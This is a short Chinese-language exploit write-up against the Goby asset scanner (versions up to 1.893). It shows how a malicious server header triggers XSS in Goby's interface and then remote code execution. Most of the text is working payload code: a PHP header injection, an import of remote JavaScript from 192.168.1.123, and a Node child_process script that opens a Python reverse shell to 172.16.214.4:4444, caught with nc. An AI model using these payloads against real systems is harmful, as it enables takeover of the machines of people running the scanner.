## 影響版本
Goby <= 1.893

## XSS
在Web服務中創建index.php並且寫入以下內容：
```
<?php
header("X-Powered-By: PHP/<img    src=1    onerror=alert(\"TeamsSix@WgpSec\")>");
?>
```

使用Goby掃描目標，點擊左側的【全部資產】，然後點擊對應的資產URL即觸發XSS。


## RCE
要利用RCE漏洞需要創建一個js文件：

Mac：
```
(function(){
require('child_process').exec('open /System/Applications/Calculator.app');
require('child_process').exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.214.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
})();
```

如果使用的是Windows或者Macos，修改exec的Payload即可。


接下來修改index.php:
```
<?php
header("X-Powered-By: PHP/<img    src=1    onerror=import(unescape('http%3A//192.168.1.123/mac.js'))>");
?>
```

在192.168.1.123機器使用nc監聽4444端口，Goby點擊掃描，點擊【掃描結果】中192.168.1.123的【詳細信息】即觸發RCE漏洞。






